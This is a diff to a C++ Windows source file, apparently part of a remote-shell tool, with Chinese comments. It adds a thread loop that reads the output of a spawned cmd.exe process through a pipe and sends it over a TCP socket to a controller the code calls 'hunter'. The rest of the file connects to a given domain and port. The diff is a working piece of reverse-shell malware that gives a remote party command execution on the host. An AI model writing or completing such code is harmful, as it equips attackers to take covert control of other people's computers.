@@ -1,12 +1,19 @@
 #include "pch.h"
 #include "Shell.h"
 
+#define SEND_SIZE   256
+#define RESULT_SIZE 2048
+
 static Shell gShell; // 初始化类
 static TcpSocket gSock; // 传递数据的套接字
 // 四个HANDLE 用来创建两个管道
 static HANDLE ghReadPipe1, ghWritePipe1, ghReadPipe2, ghWritePipe2;
 // 创建命令行进程之后拿到的pi 控制cmd进程
 static PROCESS_INFORMATION gPi = { 0 };
+// 准备缓存
+// 准备缓存
+static CHAR szSend[SEND_SIZE] = { 0 };
+static CHAR szResult[RESULT_SIZE] = { 0 };
 
 void Shell::startShell(std::string domain, int port) {
 	// 新建连接到hunter端的socket连接
@@ -73,4 +80,35 @@ bool Shell::createCmd() {
 
 // 线程函数 负责沟通管道和socket
 DWORD Shell::threadProc(LPVOID args) {
+	// 数据处理循环
+	while (true)
+	{
+		// -------------------------------接收管道数据部分（命令回显）----------------------------
+		DWORD dwBytesResult = 0;
+		RtlZeroMemory(szResult, sizeof(szResult));
+		// 先看有没有数据 防止没有数据还去读引起堵塞
+		if (!PeekNamedPipe(ghReadPipe1, szResult, sizeof(szResult), &dwBytesResult, NULL, NULL)) {
+			break;
+		}
+		// 有数据就读
+		if (dwBytesResult) {
+			RtlZeroMemory(szResult, sizeof(szResult));
+			if (!ReadFile(ghReadPipe1, szResult, sizeof(szResult), &dwBytesResult, NULL)) {
+				break;
+			}
+			// 读了数据就送回hunter
+			if (!gSock.sendData(szResult, lstrlenA(szResult))) {
+				break;
+			}
+		}
+
+	}
+	
+	// 一旦发生错误就处理后事
+	CloseHandle(ghReadPipe1);
+	CloseHandle(ghReadPipe2);
+	CloseHandle(ghWritePipe1);
+	CloseHandle(ghWritePipe2);
+	gSock.dissconnect();
+	return 1;
 }
